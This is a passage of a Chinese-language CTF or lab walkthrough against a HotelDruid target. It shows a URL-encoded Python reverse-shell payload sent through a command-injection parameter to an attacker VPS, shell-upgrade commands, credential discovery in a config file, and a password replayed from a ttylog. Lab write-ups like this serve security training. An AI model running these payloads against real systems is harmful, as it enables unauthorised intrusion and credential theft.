## 3.3 反弹shell

利用命令执行参数进行反弹shell操作

vps开启监听![](../Images/bdb62ba63d5b28f8474961521f7d5606.png)

url执行反弹shell命令

```

http://10.10.10.22/dati/selectappartamenti.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect((%22xxx.xxx.xxx.xxx%22,1211));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(\[%22/bin/bash%22,%22-i%22\]);%27
```

![](../Images/05b540754c9559ff36c92fde5c4625b4.png)

此时服务器回显 nc: getnameinfo: Temporary failure in name resolution![](../Images/d07daf147605e20eee0ae4b427a2e666.png)

通过查阅，将nc -lvp多加一个n，变成nc -lvnp即可解决此问题![](../Images/9697a94c0a5564d89ca185755529fd2e.png)

shell成功反弹过来

反弹成功后，切换到交互式shell

python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM\=\*\*xterm

Ctrl+z快捷键  
stty -a

stty raw -echo;fg

reset![](../Images/564cca52bb80049982e13640f7de27dd.png)

切换完成之后，查找可提权的信息![](../Images/b7964cda754aae264ca01b3cc88425cc.png)

找到了person普通用户

在/html/hoteldruid/data下的dati\_connessione.php文件，找到了mysql的连接账号密码![](../Images/e297d79f6da83cc31ab341d5d3eda364.png)

继续寻找有用信息，在/html下有ttylog文件![](../Images/1684558d8c85a06d7915a7c090c110fd.png)

ttylog是 ttyrec录制的文件 可以用ttyplay播放

使用命令：ttyplay ttylog

查看ttylog文件![](../Images/43248eec3dc8d85014c0464dcf34e4b0.png)

通过使用该命令得到了密码：Endur4nc3.

在之前的信息收集过程中，靶机开放了22端口，且刚刚找到了一个person用户

使用xshell连接22端口![](../Images/21b60776b1d56c088e87abd37912a8ea.png)

/目录下有user.txt文件，查看后得到flag
